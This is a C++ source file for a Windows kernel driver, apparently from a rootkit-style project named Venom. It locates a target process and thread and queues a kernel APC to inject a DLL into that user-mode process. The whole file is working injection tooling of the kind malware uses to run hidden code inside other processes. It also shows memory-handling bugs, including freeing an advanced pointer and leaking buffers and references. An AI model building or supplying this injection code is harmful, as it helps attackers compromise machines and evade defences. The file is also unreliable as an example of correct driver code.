#include "UMInjectionHandler.h"
#include "Venom.h"


HANDLE UMInjectionHandler::getProcessId(UNICODE_STRING processName)
{
    auto status = STATUS_SUCCESS;
    PVOID pBuf = ExAllocatePoolWithTag(NonPagedPool, 1024 * 1024, DRIVER_TAG);
    PSYSTEM_PROCESS_INFO pInfo = (PSYSTEM_PROCESS_INFO)pBuf;

    if (!pInfo)
    {
        DbgPrint("UMInjectionHandler: %s: Failed to allocate memory for process list\n", __FUNCTION__);
        return 0;
    }

    status = ZwQuerySystemInformation(SystemProcessInformation, pInfo, 1024 * 1024, NULL);
    if (!NT_SUCCESS(status))
    {
        ExFreePoolWithTag(pBuf, DRIVER_TAG);
        return 0;
    }

    if (NT_SUCCESS(status))
    {
        status = STATUS_NOT_FOUND;
        for (;;)
        {
            if (RtlEqualUnicodeString(&pInfo->ImageName, &processName, TRUE))
            {
                DbgPrint("The pid is %lu", HandleToUlong(pInfo->UniqueProcessId));
                return pInfo->UniqueProcessId;
                break;
            }
            else if (pInfo->NextEntryOffset)
                pInfo = (PSYSTEM_PROCESS_INFO)((PUCHAR)pInfo + pInfo->NextEntryOffset);
            else
                break;
        }
    }

    return 0;
}

NTSTATUS UMInjectionHandler::getProcessThread(PEPROCESS pProcess, PETHREAD* ppThread)
{
    auto status = STATUS_SUCCESS;
    HANDLE pid = PsGetProcessId(pProcess);
    PSYSTEM_PROCESS_INFO pInfo = (PSYSTEM_PROCESS_INFO)ExAllocatePoolWithTag(NonPagedPool, 1024 * 1024, DRIVER_TAG);

    ASSERT(ppThread != NULL);
    if (ppThread == NULL)
        return STATUS_INVALID_PARAMETER;

    if (!pInfo)
    {
        DbgPrint("UMInjectionHandler: %s: Failed to allocate memory for process list\n", __FUNCTION__);
        return STATUS_NO_MEMORY;
    }

    status = ZwQuerySystemInformation(SystemProcessInformation, pInfo, 1024 * 1024, NULL);
    if (!NT_SUCCESS(status))
    {
        ExFreePoolWithTag(pInfo, DRIVER_TAG);
        return status;
    }

    // Find the target process.
    if (NT_SUCCESS(status))
    {
        status = STATUS_NOT_FOUND;
        for (;;)
        {
            if (pInfo->UniqueProcessId == pid)
            {
                status = STATUS_SUCCESS;
                break;
            }
            else if (pInfo->NextEntryOffset)
                pInfo = (PSYSTEM_PROCESS_INFO)((PUCHAR)pInfo + pInfo->NextEntryOffset);
            else
                break;
        }
    }

    BOOLEAN isWow64 = PsGetProcessWow64Process(pProcess) != NULL;

    // Reference target thread.
    if (NT_SUCCESS(status))
    {
        status = STATUS_NOT_FOUND;

        // Get first valid thread.
        for (ULONG i = 0; i < pInfo->NumberOfThreads; i++)
        {
            // Skip current thread.
            if (pInfo->Threads[i].ClientId.UniqueThread == PsGetCurrentThreadId())
                continue;

            status = PsLookupThreadByThreadId(pInfo->Threads[i].ClientId.UniqueThread, ppThread);

            // Skip specific threads.
            if (*ppThread)
            {
                if (isWow64 || PsIsProtectedProcess(pProcess))
                {
                    ObDereferenceObject(*ppThread);
                    *ppThread = NULL;
                    continue;
                }
            }

            break;
        }
    }
    else
        DbgPrint("UMInjectionHandler: %s: Failed to locate process\n", __FUNCTION__);

    if (pInfo)
        ExFreePoolWithTag(pInfo, DRIVER_TAG);

    // No suitable thread found.
    if (!*ppThread)
        status = STATUS_NOT_FOUND;

    return status;
}

NTSTATUS UMInjectionHandler::injectDll(ULONG pid)
{
    PEPROCESS pProcess;
    PETHREAD pThread;
    auto status = STATUS_SUCCESS;

    status = PsLookupProcessByProcessId(UlongToHandle(pid), &pProcess);

    if (!NT_SUCCESS(status))
        return status;

    status = getProcessThread(pProcess, &pThread);

    if (!NT_SUCCESS(status))
        return status;

    PKAPC apc = (PKAPC)ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), DRIVER_TAG);

    if (!apc) {
        KdPrint(("[-] Could not queue a kernel APC due to insufficient memory.\n"));
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    ApcHandler::KeInitializeApc(
        apc,
        pThread,
        ApcHandler::OriginalApcEnvironment,
        &ApcHandler::kernelFreeKapc,
        &ApcHandler::rundownFreeKapc,
        &ApcHandler::normalInjectCode,
        KernelMode,
        nullptr
    );

    if (::ExAcquireRundownProtection(&ApcHandler::g_rundown_protection)) {
        auto inserted = ApcHandler::KeInsertQueueApc(
            apc,
            nullptr,
            nullptr,
            0
        );

        if (!inserted) {
            ExFreePoolWithTag(apc, DRIVER_TAG);
            ::ExReleaseRundownProtection(&ApcHandler::g_rundown_protection);

            KdPrint(("[-] Could not insert a kernel APC.\n"));
            return STATUS_INTERNAL_ERROR;
        }
    }
    return STATUS_SUCCESS;
}